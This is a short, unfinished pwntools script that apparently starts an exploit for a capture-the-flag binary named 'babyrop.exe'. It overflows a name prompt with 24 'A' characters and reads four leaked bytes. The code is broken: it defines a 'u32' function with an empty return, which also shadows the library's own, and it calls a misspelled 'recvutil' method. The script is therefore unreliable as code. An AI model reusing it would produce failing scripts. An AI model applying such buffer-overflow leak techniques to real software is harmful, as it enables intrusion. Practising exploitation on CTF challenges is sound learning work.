from pwn import *
from struct import *
io = process("./babyrop.exe")
def u32(data):
	return 

io.recvutil("name")
io.sendline("A"*24)
io.recvutil("A"*24)
crt=io.recv(4)
crt=u32(crt)